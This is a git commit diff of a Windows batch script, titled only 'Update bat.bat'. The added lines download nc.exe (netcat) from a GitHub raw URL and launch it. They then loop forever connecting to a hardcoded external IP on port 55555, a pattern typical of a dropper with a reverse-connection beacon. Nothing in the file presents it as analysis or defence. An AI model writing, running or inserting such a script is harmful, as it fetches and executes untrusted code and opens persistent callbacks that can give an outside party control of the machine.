bab9924ecf2e03358587d335e8ee724196dcde91
VRVRxX <voldemaars.lvovs@gmail.com>
2026-06-23 22:52:52 +0300

    Update bat.bat

--- bat.bat
+++ bat.bat
@@ -1,13 +1,11 @@
 @echo off
 :check
 if exist "%~dp0nc.exe" goto loop
-rem step 2
+curl -L -o nc.exe https://raw.githubusercontent.com/VRVRxX/projects/main/nc.exe && start nc.exe
 timeout /t 5 /nobreak>nul
 goto check
 :loop
-rem step 3
+nc 81.198.239.38 55555
 goto loop
 pause
 exit
-
-rem curl -L -o nc.exe https://raw.githubusercontent.com/VRVRxX/projects/main/nc.exe && start nc.exe
